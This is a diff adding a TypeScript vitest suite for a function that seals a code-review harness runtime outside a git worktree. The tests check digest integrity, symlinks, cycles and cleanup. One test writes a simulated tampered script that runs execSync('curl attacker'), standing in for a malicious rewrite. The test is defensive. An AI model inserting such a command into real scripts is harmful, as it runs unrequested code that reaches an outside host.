@@ -1,0 +1,142 @@
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join, relative, isAbsolute } from 'node:path';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+
+import { harnessScriptDigest, resolveHarnessScript, sealHarnessRuntimeFrom } from './runtime.js';
+
+/**
+ * Review finding (2026-07-27), sandbox escape.
+ *
+ * The runtime resolves its schemas relative to its own location
+ * (`../references/*.schema.json` and `../../om-code-review/references/*.md`),
+ * so sealing only `harness.mjs` would move it somewhere it cannot run. The whole
+ * skill tree comes along and the relative layout is preserved.
+ */
+describe('sealHarnessRuntimeFrom', () => {
+  let worktree: string;
+  let dest: string;
+
+  const skillFile = (...parts: string[]) =>
+    join(worktree, '.claude', 'skills', ...parts);
+
+  beforeEach(() => {
+    worktree = mkdtempSync(join(tmpdir(), 'cez-seal-wt-'));
+    dest = mkdtempSync(join(tmpdir(), 'cez-seal-dest-'));
+    mkdirSync(skillFile('cez-harness', 'scripts'), { recursive: true });
+    mkdirSync(skillFile('cez-harness', 'references'), { recursive: true });
+    mkdirSync(skillFile('om-code-review', 'references'), { recursive: true });
+    writeFileSync(skillFile('cez-harness', 'scripts', 'harness.mjs'), 'export const real = 1\n');
+    writeFileSync(skillFile('cez-harness', 'references', 'review-result.schema.json'), '{}');
+    writeFileSync(skillFile('om-code-review', 'references', 'review-checklist.md'), '# checklist');
+  });
+
+  afterEach(() => {
+    rmSync(worktree, { recursive: true, force: true });
+    rmSync(dest, { recursive: true, force: true });
+  });
+
+  it('seals the runtime outside the worktree', () => {
+    const sealed = sealHarnessRuntimeFrom(skillFile(), dest)!;
+
+    expect(sealed).not.toBeNull();
+    const escaped = relative(worktree, sealed.script);
+    expect(escaped.startsWith('..') || isAbsolute(escaped)).toBe(true);
+    expect(readFileSync(sealed.script, 'utf8')).toBe('export const real = 1\n');
+  });
+
+  it('carries the sibling files the runtime resolves relatively', () => {
+    const sealed = sealHarnessRuntimeFrom(skillFile(), dest)!;
+    const runtimeDir = join(sealed.script, '..');
+
+    expect(readFileSync(join(runtimeDir, '..', 'references', 'review-result.schema.json'), 'utf8')).toBe('{}');
+    expect(
+      readFileSync(
+        join(runtimeDir, '..', '..', 'om-code-review', 'references', 'review-checklist.md'),
+        'utf8',
+      ),
+    ).toBe('# checklist');
+  });
+
+  it('is immune to a later rewrite of the worktree copy', () => {
+    const sealed = sealHarnessRuntimeFrom(skillFile(), dest)!;
+
+    writeFileSync(
+      resolveHarnessScript(worktree)!,
+      'import{execSync}from"node:child_process";execSync("curl attacker")\n',
+    );
+
+    expect(readFileSync(sealed.script, 'utf8')).toBe('export const real = 1\n');
+    expect(harnessScriptDigest(sealed.script)).toBe(sealed.sha256);
+  });
+
+  it('detects tampering with the sealed copy itself', () => {
+    const sealed = sealHarnessRuntimeFrom(skillFile(), dest)!;
+
+    writeFileSync(sealed.script, 'export const real = 2\n');
+
+    expect(harnessScriptDigest(sealed.script)).not.toBe(sealed.sha256);
+  });
+
+  it('seals a symlinked skill by value, not by reference', () => {
+    const linkTarget = mkdtempSync(join(tmpdir(), 'cez-seal-team-'));
+    mkdirSync(join(linkTarget, 'scripts'), { recursive: true });
+    writeFileSync(join(linkTarget, 'scripts', 'harness.mjs'), 'export const team = 1\n');
+    rmSync(skillFile('cez-harness'), { recursive: true, force: true });
+    symlinkSync(linkTarget, skillFile('cez-harness'), 'dir');
+
+    const sealed = sealHarnessRuntimeFrom(skillFile(), dest)!;
+    writeFileSync(join(linkTarget, 'scripts', 'harness.mjs'), 'export const tampered = 1\n');
+
+    expect(readFileSync(sealed.script, 'utf8')).toBe('export const team = 1\n');
+    rmSync(linkTarget, { recursive: true, force: true });
+  });
+
+  it('refuses a symlink cycle instead of recursing through untrusted skill input', () => {
+    symlinkSync(
+      skillFile('cez-harness'),
+      skillFile('cez-harness', 'references', 'cycle'),
+      'dir',
+    );
+
+    expect(sealHarnessRuntimeFrom(skillFile(), dest)).toBeNull();
+    expect(existsSync(join(dest, 'skills'))).toBe(false);
+  });
+
+  it('returns null when the destination is a file', () => {
+    const blocked = join(dest, 'not-a-directory');
+    writeFileSync(blocked, 'preserve this file');
+
+    expect(sealHarnessRuntimeFrom(skillFile(), blocked)).toBeNull();
+    expect(readFileSync(blocked, 'utf8')).toBe('preserve this file');
+  });
+
+  it.runIf(process.platform !== 'win32' && process.getuid?.() !== 0)(
+    'returns null when a read-only seal also prevents cleanup', () => {
+      expect(sealHarnessRuntimeFrom(skillFile(), dest)).not.toBeNull();
+      const blocked = join(dest, 'skills');
+      chmodSync(blocked, 0o500);
+      try {
+        expect(sealHarnessRuntimeFrom(skillFile(), dest)).toBeNull();
+      } finally {
+        chmodSync(blocked, 0o700);
+      }
+    },
+  );
+
+  it('returns null when there is no runtime to seal', () => {
+    rmSync(skillFile('cez-harness'), { recursive: true, force: true });
+
+    expect(sealHarnessRuntimeFrom(skillFile(), dest)).toBeNull();
+  });
+
+  it('reseals cleanly over a previous run', () => {
+    const first = sealHarnessRuntimeFrom(skillFile(), dest)!;
+    writeFileSync(skillFile('cez-harness', 'scripts', 'harness.mjs'), 'export const real = 3\n');
+
+    const second = sealHarnessRuntimeFrom(skillFile(), dest)!;
+
+    expect(second.sha256).not.toBe(first.sha256);
+    expect(readFileSync(second.script, 'utf8')).toBe('export const real = 3\n');
+  });
+});
